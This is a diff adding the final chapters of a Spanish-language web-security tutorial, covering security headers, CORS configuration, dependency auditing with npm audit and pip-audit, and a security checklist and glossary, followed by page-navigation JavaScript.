+      <tr><th>Content-Security-Policy</th><td>Limita de dónde puede cargar scripts, estilos e imágenes. Tu mejor defensa extra contra XSS.</td></tr>
+      <tr><th>X-Content-Type-Options: nosniff</th><td>Evita que el navegador "adivine" el tipo de un archivo y lo ejecute mal.</td></tr>
+      <tr><th>X-Frame-Options</th><td>Impide que tu sitio se cargue dentro de un iframe ajeno (ataques de clickjacking).</td></tr>
+    </tbody>
+  </table></div>
+  <p>Hay librerías que los ponen todos con una línea, como <code>helmet</code> en Express. No hay razón para no usarlas.</p>
+  <h2>CORS: quién puede llamar a tu API</h2>
+  <p>Por seguridad, el navegador bloquea que una página de un dominio llame por JavaScript a una API de otro dominio, salvo que la API lo permita explícitamente. Eso es CORS. Vos configurás qué orígenes pueden consumir tu API:</p>
+  <div class="codehead"><span class="lang py">CORS en FastAPI</span></div>
+<pre>from fastapi.middleware.cors import CORSMiddleware
+app.add_middleware(CORSMiddleware,
+    allow_origins=["https://miapp.com"],   <span class="cm"># solo tu frontend</span>
+    allow_methods=["*"])</pre>
+  <div class="box ojo"><span class="tag">No abras CORS a todos</span><p>Ver <code>allow_origins=["*"]</code> en producción es una señal de alarma. Permitir cualquier origen deja que cualquier sitio consuma tu API desde el navegador de tus usuarios. Listá solo los dominios que de verdad la necesitan.</p></div>
+  <div class="navrow"><button class="navbtn" data-goto="8"><span class="dir">Anterior</span><span class="t">← Secretos</span></button><button class="navbtn next" data-goto="10"><span class="dir">Siguiente</span><span class="t">Dependencias →</span></button></div>
+</section>
+
+<!-- 10 -->
+<section class="chapter" data-part="Parte 3 · Endurecer" data-num="10" data-title="Dependencias" id="dependencias">
+  <div class="ch-eyebrow">Capítulo 10</div>
+  <h1>El riesgo que no escribiste vos</h1>
+  <p class="lead">Tu app usa decenas o cientos de librerías de terceros. Cada una es código que corre en tu servidor y que vos no revisaste. Una vulnerabilidad en cualquiera de ellas es una vulnerabilidad tuya.</p>
+  <h2>Escaneá tus dependencias</h2>
+  <p>Las herramientas de tu ecosistema revisan tus dependencias contra bases de vulnerabilidades conocidas, y te dicen qué actualizar:</p>
+  <div class="codehead"><span class="lang sh">shell</span></div>
+<pre>npm audit          # Node: lista vulnerabilidades conocidas
+npm audit fix      # actualiza lo que puede automáticamente
+
+pip-audit          # Python: lo mismo para pip</pre>
+  <p>Corré esto seguido, e idealmente en tu pipeline de CI (del librito de CI/CD), para que cada push avise si entró una dependencia vulnerable. GitHub también lo hace solo con Dependabot, que hasta te abre los PRs de actualización.</p>
+  <h2>Buenas costumbres con dependencias</h2>
+  <ul>
+    <li>Fijá las versiones (con el lockfile) para builds reproducibles.</li>
+    <li>Actualizá seguido y de a poco, en vez de saltos gigantes cada dos años.</li>
+    <li>Antes de sumar una librería, mirá si está mantenida y cuánto pesa. Cada dependencia es superficie de ataque.</li>
+    <li>Desconfiá de paquetes con nombres parecidos a los populares: es una técnica de ataque (typosquatting).</li>
+  </ul>
+  <div class="navrow"><button class="navbtn" data-goto="9"><span class="dir">Anterior</span><span class="t">← Headers y CORS</span></button><button class="navbtn next" data-goto="11"><span class="dir">Siguiente</span><span class="t">Checklist →</span></button></div>
+</section>
+
+<!-- 11 -->
+<section class="chapter" data-part="Parte 4 · A producción" data-num="11" data-title="Checklist y glosario" id="cierre">
+  <div class="ch-eyebrow">Cierre</div>
+  <h1>Checklist y glosario</h1>
+  <h2>Checklist de seguridad web</h2>
+  <ul>
+    <li>HTTPS forzado en todo el sitio, con HSTS.</li>
+    <li>Toda entrada validada del lado del servidor. Nunca confiar en el cliente.</li>
+    <li>Consultas SQL siempre parametrizadas.</li>
+    <li>Salida escapada para evitar XSS (o framework que lo haga).</li>
+    <li>Protección CSRF activa, cookies con <code>SameSite</code>.</li>
+    <li>Contraseñas con bcrypt / argon2 y sal. Nunca en texto plano.</li>
+    <li>Autorización chequeada en cada endpoint, no solo autenticación.</li>
+    <li>Secretos en variables de entorno, jamás en el código.</li>
+    <li>Headers de seguridad puestos (helmet o equivalente).</li>
+    <li>CORS restringido a los orígenes necesarios.</li>
+    <li>Dependencias escaneadas y actualizadas.</li>
+    <li>Rate limiting en login y endpoints sensibles.</li>
+  </ul>
+  <h2>Glosario</h2>
+  <div class="table-wrap"><table>
+    <thead><tr><th>Término</th><th>Qué es</th></tr></thead>
+    <tbody>
+      <tr><th>Inyección SQL</th><td>Ejecutar SQL malicioso por pegar texto del usuario en una query.</td></tr>
+      <tr><th>XSS</th><td>Ejecutar JavaScript malicioso en el navegador de otros por no escapar la salida.</td></tr>
+      <tr><th>CSRF</th><td>Forzar una acción usando la sesión activa de la víctima.</td></tr>
+      <tr><th>Hash</th><td>Transformación de un solo sentido; se guarda en vez de la contraseña.</td></tr>
+      <tr><th>Sal</th><td>Valor aleatorio por usuario que se agrega antes de hashear.</td></tr>
+      <tr><th>IDOR</th><td>Acceder a datos ajenos cambiando un id en la URL.</td></tr>
+      <tr><th>CORS</th><td>Reglas de qué orígenes pueden llamar a tu API desde el navegador.</td></tr>
+      <tr><th>OWASP</th><td>Organización que publica el Top 10 de riesgos web.</td></tr>
+    </tbody>
+  </table></div>
+  <div class="box nota"><span class="tag">Lo que te llevás</span><p>Sabés reconocer y tapar las fallas más comunes: inyección, XSS, CSRF, contraseñas mal guardadas, control de acceso flojo, secretos filtrados. La seguridad no se termina nunca, pero cubrir estas ya te pone por delante de la mayoría. Aplicá el checklist en tu próximo proyecto de entrada, no al final.</p></div>
+  <div class="navrow"><button class="navbtn" data-goto="10"><span class="dir">Anterior</span><span class="t">← Dependencias</span></button><button class="navbtn next" data-goto="0"><span class="dir">Volver al</span><span class="t">Inicio ↺</span></button></div>
+</section>
+    </div>
+  </main>
+</div>
+
+<script>
+  var chapters = Array.prototype.slice.call(document.querySelectorAll('.chapter'));
+  var toc = document.getElementById('toc');
+  var reader = document.getElementById('reader');
+  var progBar = document.getElementById('progBar');
+  var progText = document.getElementById('progText');
+  var sidebar = document.getElementById('sidebar');
+  var overlay = document.getElementById('overlay');
+  var current = 0;
+
+  // build TOC grouped by data-part
+  var lastPart = null;
+  chapters.forEach(function (ch, i) {
+    var part = ch.getAttribute('data-part');
+    if (part && part !== lastPart) {
+      var pl = document.createElement('div'); pl.className = 'part-label'; pl.textContent = part; toc.appendChild(pl); lastPart = part;
+    }
+    var a = document.createElement('a');
+    a.href = '#' + ch.id;
+    a.innerHTML = '<span class="n">' + (ch.getAttribute('data-num') || '') + '</span><span>' + ch.getAttribute('data-title') + '</span>';
+    a.addEventListener('click', function (e) { e.preventDefault(); go(i); closeSide(); });
+    toc.appendChild(a);
+    ch._tocLink = a;
+  });
+
+  function go(i, noScroll) {
+    if (i < 0 || i >= chapters.length) return;
+    chapters[current].classList.remove('active');
+    if (chapters[current]._tocLink) chapters[current]._tocLink.classList.remove('active');
+    current = i;
+    chapters[current].classList.add('active');
+    if (chapters[current]._tocLink) chapters[current]._tocLink.classList.add('active');
+    progBar.style.width = ((i + 1) / chapters.length * 100) + '%';
+    progText.textContent = (i + 1) + ' / ' + chapters.length;
+    try { localStorage.setItem('sec-cap', String(i)); } catch (e) {}
+    // keep active link visible WITHOUT moving the window (scroll only the sidebar)
+    var link = chapters[current]._tocLink;
+    if (link) {
+      var top = link.offsetTop, bottom = top + link.offsetHeight;
+      if (top < sidebar.scrollTop) sidebar.scrollTop = top - 8;
+      else if (bottom > sidebar.scrollTop + sidebar.clientHeight) sidebar.scrollTop = bottom - sidebar.clientHeight + 8;
+    }
+    window.scrollTo({ top: 0, left: 0, behavior: 'auto' });
+    history.replaceState(null, '', '#' + chapters[current].id);
+  }
+
+  // prev/next buttons (delegated)
+  reader.addEventListener('click', function (e) {
+    var b = e.target.closest('[data-goto]');
+    if (b) { go(parseInt(b.getAttribute('data-goto'), 10)); }
+  });
+
+  document.addEventListener('keydown', function (e) {
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+    if (e.key === 'ArrowRight') go(current + 1);
+    if (e.key === 'ArrowLeft') go(current - 1);
+  });
+
+  // theme
+  var root = document.documentElement;
+  function curTheme() { return root.getAttribute('data-theme') || (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'); }
+  document.getElementById('themeBtn').addEventListener('click', function () {
+    var n = curTheme() === 'dark' ? 'light' : 'dark'; root.setAttribute('data-theme', n);
+    try { localStorage.setItem('sec-theme', n); } catch (e) {}
+  });
+  try { var st = localStorage.getItem('sec-theme'); if (st) root.setAttribute('data-theme', st); } catch (e) {}
+
+  // mobile drawer
+  function closeSide() { sidebar.classList.remove('open'); overlay.classList.remove('show'); }
+  document.getElementById('menuBtn').addEventListener('click', function () { sidebar.classList.toggle('open'); overlay.classList.toggle('show'); });
+  overlay.addEventListener('click', closeSide);
+
+  // restore position: hash > localStorage > 0
+  (function () {
+    var start = 0;
+    if (location.hash) { var idx = chapters.findIndex(function (c) { return '#' + c.id === location.hash; }); if (idx >= 0) start = idx; }
+    else { try { var s = localStorage.getItem('sec-cap'); if (s !== null) start = Math.min(parseInt(s, 10) || 0, chapters.length - 1); } catch (e) {} }
+    go(start, true);
+  })();
+</script>
+
+</html>
